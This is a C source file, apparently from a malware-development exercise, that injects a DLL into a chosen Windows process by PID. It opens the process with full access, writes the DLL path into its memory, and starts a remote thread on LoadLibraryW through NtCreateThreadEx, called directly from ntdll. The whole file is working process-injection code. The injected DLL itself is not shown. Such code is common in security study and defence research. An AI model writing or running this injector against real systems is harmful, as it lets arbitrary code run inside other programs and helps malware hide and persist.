#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

char k[4] = "(+)";
char i[4] = "(*)";
char e[4] = "(-)";


typedef NTSTATUS(NTAPI* pNtCreateThreadEx) ( // NtCreateThreadEx()
        OUT PHANDLE hThread,
        IN ACCESS_MASK DesiredAccess,
        IN PVOID ObjectAttributes,
        IN HANDLE ProcessHandle,
        IN PVOID lpStartAddress,
        IN PVOID lpParameter,
        IN ULONG Flags,
        IN SIZE_T StackZeroBits,
        IN SIZE_T SizeOfStackCommit,
        IN SIZE_T SizeOfStackReserve,
        OUT PVOID lpBytesBuffer
    );

LPVOID rBuffer;
HANDLE hThread;
HANDLE hProcess;

wchar_t dllLocation[MAX_PATH] = L"C:\\Users\\baile\\Desktop\\TEST\\maldev\\Process Injection\\DLL Injection\\dllinjection.dll";
size_t dllSize = sizeof(dllLocation);

int main(int argc, char* argv[]) {

    if (argc < 2) {
        printf("%s usage: ntdllinjection.exe <pid>", e);
        return EXIT_FAILURE;
    }

    DWORD PID = atoi(argv[1]);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (!hProcess || hProcess == NULL) {
        printf("%s could not create handle to process [%d]", e, PID);
        return EXIT_FAILURE;
    }

    printf("%s created handle to process [%d]\n", k, PID);
    printf("%s allocating memory within process...\n", i);

    rBuffer = VirtualAllocEx(hProcess, rBuffer, dllSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

    printf("%s allocated space within process\n\n", k);
    printf("\t%s VirtualAllocEx() [flProtect -> PAGE_READWRITE]\n", i);
    printf("\t%s VirtualAllocEx() [flAllocationType -> MEM_COMMIT | MEM_RESERVE]\n\n", i);
    printf("%s writing to process memory...\n", i);

    WriteProcessMemory(hProcess, rBuffer, (LPVOID)dllLocation, dllSize, NULL);

    printf("%s wrote to process memory\n\n", k);
    printf("\t%s getting library [LoadLibraryW() -> Kernel32] address...\n", i);
    printf("\t%s starting PTHREAD_START_ROUTINE...\n\n", i);

    LPTHREAD_START_ROUTINE loadLib = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW"); // get handle of Kernel32, then look for LoadLibraryA()
    pNtCreateThreadEx threadCreate = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx"); // just a pointer to the native NTAPI itself (insidle ntdll.dll)

    if (!threadCreate) {
        printf("%s couldn't get address of NtCreateThreadEx, error = %ld\n", e, GetLastError());
        CloseHandle(hProcess);
        printf("%s closed handle to process\n", i);
        return EXIT_FAILURE;
    }

    printf("%s loaded library address 0x%p\n", k, loadLib);
    printf("%s got address of NtCreateThreadEx: 0x%p\n", k, threadCreate);

    threadCreate(
        &hThread,
        0x1FFFFF,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE) loadLib,
        rBuffer,
        FALSE,
        NULL,
        NULL,
        NULL,
        NULL
    );

    printf("%s used custom vers of native NTDLL func (threadCreate) to create a thread\n", k);

    if(hThread == NULL) {
        printf("%s couldn't create thread\n", e);
        CloseHandle(hProcess);
        printf("%s closed handle to process\n", i);
        return EXIT_FAILURE;
    }
    
    else {
        printf("%s injected with custom func (threadCreate) NtCreateThreadEx directly from NTDLL\n", k);
    }

    WaitForSingleObject(hThread, INFINITE);
    
    printf("%s closing handle to thread...\n", i);
    CloseHandle(hThread);
    printf("%s closing handle to process...\n", i);
    CloseHandle(hProcess);
    printf("%s finished", k);

    return EXIT_SUCCESS;

}
